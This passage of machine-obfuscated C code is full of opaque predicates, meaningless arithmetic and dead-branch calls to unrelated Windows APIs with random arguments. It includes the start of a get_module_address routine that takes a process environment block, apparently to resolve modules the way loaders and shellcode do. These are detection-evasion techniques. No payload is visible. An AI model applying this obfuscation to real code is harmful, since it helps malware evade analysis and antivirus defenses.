                        ve02a4744760fad39fcd116c5cc851574_useless_opaque = vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque / v919d1d5745bca768ecbaff770e72d5c3_computation_opaque;
                        if (!(((v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque == ((unsigned int) 2))))
                        {
                          v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque = v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque || v4f481b54de890716f2463ecc1eae8496_computation_opaque;
                          v72ba35f33f07ba681820321c1e01aabe_computation_opaque = vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque - v4f481b54de890716f2463ecc1eae8496_computation_opaque;
                          vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque | v4f481b54de890716f2463ecc1eae8496_computation_opaque;
                          vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque != ((unsigned int) 120);
                          vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = v72ba35f33f07ba681820321c1e01aabe_computation_opaque % v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque;
                        }
                      }
                      v72ba35f33f07ba681820321c1e01aabe_computation_opaque = v72ba35f33f07ba681820321c1e01aabe_computation_opaque + ((unsigned int) 2);
                    }

                  }
                }

                if (((v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque == ((unsigned int) 2)))
                {
                  unsigned int v9f29fa1eaf2d1d81144f76a2c4fb0b03_prime_opaque = v4f481b54de890716f2463ecc1eae8496_computation_opaque;
                  if (((v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque == ((unsigned int) 2)))
                  {
                    {
                      unsigned int v931b5153fec2b1787ca59905e12304ad_useless_opaque = (unsigned int) 336656788;
                      unsigned int vaf3b1b95c000731e68fe31f7048a6567_computation_opaque = (unsigned int) (&v931b5153fec2b1787ca59905e12304ad_useless_opaque);
                      unsigned int v67e51a865576ba9dd59e16b5373756a5_true_opaque = (((vaf3b1b95c000731e68fe31f7048a6567_computation_opaque * vaf3b1b95c000731e68fe31f7048a6567_computation_opaque) + vaf3b1b95c000731e68fe31f7048a6567_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
                      const char *current = buffer;
                      for (int i = 0; i < n; i++)
                      {
                        while ((*current) != '\x00')
                        {
                          current++;
                        }

                        current++;
                        if (!v67e51a865576ba9dd59e16b5373756a5_true_opaque)
                        {
                          unsigned long vdfe518060a29aef691007e37cc1671d3 = (unsigned long) 0x2f316109;
                          unsigned long vb830a14f322d02f10265bcf13ceeadc9 = (unsigned long) 0xda09f759;
                          vb830a14f322d02f10265bcf13ceeadc9 = MsiGetActiveDatabase(vdfe518060a29aef691007e37cc1671d3);
                          if (!v67e51a865576ba9dd59e16b5373756a5_true_opaque)
                          {
                            void * v96f164ba37d7d4f791a5bd1477899bd5 = (void *) 0xc8db5945;
                            unsigned long v0375b2b467072d03eb1f7a743d4ebcf7 = (unsigned long) 0x0fb73310;
                            unsigned long va49082fa7d69f72af204a579c6b3dba9 = (unsigned long) 0x5be7c001;
                            va49082fa7d69f72af204a579c6b3dba9 = SnmpListen(v96f164ba37d7d4f791a5bd1477899bd5, v0375b2b467072d03eb1f7a743d4ebcf7);
                          }
                        }
                      }

                      return current;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
    {
      void * vf8408b867126647be867ff43e4875e4f = (void *) 0x45e7e999;
      unsigned long vaa22f1aad2fb1eaf1d6afb39215a8e03 = (unsigned long) 0x8b687dc5;
      if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
      {
        unsigned long v4ae0bdc2ddb055432f2110b3436471f5 = (unsigned long) 0x16f21b3d;
        v4ae0bdc2ddb055432f2110b3436471f5 = SnmpListen(vf8408b867126647be867ff43e4875e4f, vaa22f1aad2fb1eaf1d6afb39215a8e03);
        if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
        {
          v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque = v919d1d5745bca768ecbaff770e72d5c3_computation_opaque == vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque;
          if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
          {
            v919d1d5745bca768ecbaff770e72d5c3_computation_opaque = va10d3272a926a4352d6d8b84b8698d36_random_opaque / ((unsigned int) 52);
            vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque + v919d1d5745bca768ecbaff770e72d5c3_computation_opaque;
            v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque = v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque - v919d1d5745bca768ecbaff770e72d5c3_computation_opaque;
            va10d3272a926a4352d6d8b84b8698d36_random_opaque = vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque + v919d1d5745bca768ecbaff770e72d5c3_computation_opaque;
            vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque < vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque;
            vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = v919d1d5745bca768ecbaff770e72d5c3_computation_opaque % v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque;
          }
          v919d1d5745bca768ecbaff770e72d5c3_computation_opaque = va10d3272a926a4352d6d8b84b8698d36_random_opaque / v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque;
          va10d3272a926a4352d6d8b84b8698d36_random_opaque = v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque <= v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque;
          va10d3272a926a4352d6d8b84b8698d36_random_opaque = vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque - vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque;
          vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque == vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque;
        }
      }
    }
    unsigned int v87cb3abd752058da4b995fd3b07ec430_useless_opaque = (unsigned int) 841785223;
    unsigned int v0208d049c01bf7c28ba3b3f997cddf91_random_opaque = (unsigned int) (&v87cb3abd752058da4b995fd3b07ec430_useless_opaque);
  }
}

void *get_module_address(PPEB process_env_block, const wchar_t *module_name)
{
  unsigned int v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = (unsigned int) 708250958;
  unsigned int v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque = (unsigned int) (&v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque);
  {
    unsigned int v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque = (unsigned int) 2769575518;
    unsigned int vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = (unsigned int) 0;
    unsigned int vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = (unsigned int) 3;
    unsigned int v25128658a1eb9dde8eca910ec9610564_computation_opaque = (unsigned int) (&v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque);
    unsigned int v13da422836d6407683e4c3be565c880b_useless_opaque = (unsigned int) 2510570482;
    unsigned int v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = (unsigned int) (&v13da422836d6407683e4c3be565c880b_useless_opaque);
    v25128658a1eb9dde8eca910ec9610564_computation_opaque = (v25128658a1eb9dde8eca910ec9610564_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (v25128658a1eb9dde8eca910ec9610564_computation_opaque < ((unsigned int) 3))
    {
      v25128658a1eb9dde8eca910ec9610564_computation_opaque = (unsigned int) 3;
      unsigned int v7d03c1eaa10d526e8bbb89237d250b30_useless_opaque = (unsigned int) 615185777;
      unsigned int v1b9c687a3523a65d69a9d529188a1350_computation_opaque = (unsigned int) 0;
      unsigned int vf7e9948c08d552fc295809ee424e56d9_computation_opaque = (unsigned int) 3;
      unsigned int vdb5a7eded0f84d4b922527cb97f10739_computation_opaque = (unsigned int) (&v7d03c1eaa10d526e8bbb89237d250b30_useless_opaque);
      vdb5a7eded0f84d4b922527cb97f10739_computation_opaque = (vdb5a7eded0f84d4b922527cb97f10739_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vdb5a7eded0f84d4b922527cb97f10739_computation_opaque < ((unsigned int) 3))
      {
        vdb5a7eded0f84d4b922527cb97f10739_computation_opaque = (unsigned int) 3;
        if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
        {
          if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
          {
            v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque = vf7e9948c08d552fc295809ee424e56d9_computation_opaque / v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque;
            if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
            {
              v25128658a1eb9dde8eca910ec9610564_computation_opaque = v1b9c687a3523a65d69a9d529188a1350_computation_opaque * vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
              v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque + vdb5a7eded0f84d4b922527cb97f10739_computation_opaque;
              vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque == v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
              vdb5a7eded0f84d4b922527cb97f10739_computation_opaque = vdb5a7eded0f84d4b922527cb97f10739_computation_opaque | vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque;
              vf7e9948c08d552fc295809ee424e56d9_computation_opaque = vdb5a7eded0f84d4b922527cb97f10739_computation_opaque < vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
              v25128658a1eb9dde8eca910ec9610564_computation_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque % vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
            }
          }
          v25128658a1eb9dde8eca910ec9610564_computation_opaque = vf7e9948c08d552fc295809ee424e56d9_computation_opaque * v1b9c687a3523a65d69a9d529188a1350_computation_opaque;
          v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque = vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque < vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
        }
      }
      while (v1b9c687a3523a65d69a9d529188a1350_computation_opaque != ((unsigned int) 1))
      {
        vdb5a7eded0f84d4b922527cb97f10739_computation_opaque += (unsigned int) 2;
        v1b9c687a3523a65d69a9d529188a1350_computation_opaque = (unsigned int) 1;
        if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
        {
          if ((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25)))
          {
            if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
            {
              if (!((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25))))
              {
                v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque + v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque;
                v1b9c687a3523a65d69a9d529188a1350_computation_opaque = vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque | vf7e9948c08d552fc295809ee424e56d9_computation_opaque;
                v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = v7d03c1eaa10d526e8bbb89237d250b30_useless_opaque * vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
              }
              void * vd49de4ab0efa9ecc217bef43332b4264 = (void *) 0xa2abf71b;
              long vc8c65e2a02842736264b8b3cb82b6c00 = (long) 0x3075aa74;
              if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
              {
                vc8c65e2a02842736264b8b3cb82b6c00 = RoUnregisterForApartmentShutdown(vd49de4ab0efa9ecc217bef43332b4264);
              }
            }
            vf7e9948c08d552fc295809ee424e56d9_computation_opaque = (unsigned int) 3;
            if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
            {
              vf7e9948c08d552fc295809ee424e56d9_computation_opaque = v1b9c687a3523a65d69a9d529188a1350_computation_opaque != vf7e9948c08d552fc295809ee424e56d9_computation_opaque;
              v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque == vf7e9948c08d552fc295809ee424e56d9_computation_opaque;
              vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque <= vdb5a7eded0f84d4b922527cb97f10739_computation_opaque;
            }
            while ((vf7e9948c08d552fc295809ee424e56d9_computation_opaque * vf7e9948c08d552fc295809ee424e56d9_computation_opaque) <= vdb5a7eded0f84d4b922527cb97f10739_computation_opaque)
            {
              if ((vdb5a7eded0f84d4b922527cb97f10739_computation_opaque % vf7e9948c08d552fc295809ee424e56d9_computation_opaque) == ((unsigned int) 0))
              {
                v1b9c687a3523a65d69a9d529188a1350_computation_opaque = (unsigned int) 0;
                if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                {
                  if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                  {
                    vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque + vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque;
                    v25128658a1eb9dde8eca910ec9610564_computation_opaque = v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque <= ((unsigned int) 62);
                    vf7e9948c08d552fc295809ee424e56d9_computation_opaque = v7d03c1eaa10d526e8bbb89237d250b30_useless_opaque || vdb5a7eded0f84d4b922527cb97f10739_computation_opaque;
                  }
                  v13da422836d6407683e4c3be565c880b_useless_opaque = v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque + v7d03c1eaa10d526e8bbb89237d250b30_useless_opaque;
                  vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque == v13da422836d6407683e4c3be565c880b_useless_opaque;
                  v1b9c687a3523a65d69a9d529188a1350_computation_opaque = v1b9c687a3523a65d69a9d529188a1350_computation_opaque != v25128658a1eb9dde8eca910ec9610564_computation_opaque;
                  vf7e9948c08d552fc295809ee424e56d9_computation_opaque = vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque <= v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque;
                }
              }
              if ((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25)))
              {
                vf7e9948c08d552fc295809ee424e56d9_computation_opaque = vf7e9948c08d552fc295809ee424e56d9_computation_opaque + ((unsigned int) 2);
              }
            }

          }
        }
      }

      unsigned int v6bc554d17ffc84d0cbb0af12bdc495fe_prime_opaque = vdb5a7eded0f84d4b922527cb97f10739_computation_opaque;
    }
    while (vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque != ((unsigned int) 1))
    {
      v25128658a1eb9dde8eca910ec9610564_computation_opaque += (unsigned int) 2;
      if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
      {
        vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = (unsigned int) 1;
        vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = (unsigned int) 3;
        while ((vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque * vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque) <= v25128658a1eb9dde8eca910ec9610564_computation_opaque)
        {
          if (!((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25))))
          {
            unsigned long vf79f03cab973613d38a6be7e06edc9ba = (unsigned long) 0x914356a9;
            if ((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25)))
            {
              unsigned long v7fb27e6242f9a2893239bffbbc6631e3 = (unsigned long) 0x3c42b067;
              v7fb27e6242f9a2893239bffbbc6631e3 = MsiGetActiveDatabase(vf79f03cab973613d38a6be7e06edc9ba);
            }
          }
          if ((v25128658a1eb9dde8eca910ec9610564_computation_opaque % vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque) == ((unsigned int) 0))
          {
            if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
            {
              if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
              {
                vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = (unsigned int) 0;
              }
            }
          }
          vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque + ((unsigned int) 2);
        }

      }
    }

    unsigned int v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque = v25128658a1eb9dde8eca910ec9610564_computation_opaque;
    {
      if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
      {
        unsigned long v1bb5a1028f461c24a422e2c7c8dda03f = (unsigned long) 0x562adf19;
        void * vf6daa7a92e2e8bdf3715f4cb1f3df118 = (void *) 0x2503873f;
        int v5c5f2a7682550ed13fbf9ab46fca6c47 = (int) 0x74932089;
        void * v52a177221e1b45ba3131d85cba77c60f = (void *) 0x96e4944e;
        int vbcc45115db93c12bbec482783f8b5dac = (int) 0x4685c73e;
        if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
        {
          if ((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25)))
          {
            int vf14583082e74f5b72eba23246d437eb8 = (int) 0x33fdb69c;
            vf14583082e74f5b72eba23246d437eb8 = IdnToNameprepUnicode(v1bb5a1028f461c24a422e2c7c8dda03f, vf6daa7a92e2e8bdf3715f4cb1f3df118, v5c5f2a7682550ed13fbf9ab46fca6c47, v52a177221e1b45ba3131d85cba77c60f, vbcc45115db93c12bbec482783f8b5dac);
            if ((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25)))
            {
              if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
              {
                if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
                {
                  v13da422836d6407683e4c3be565c880b_useless_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque * v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                  v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque = v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque || v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque;
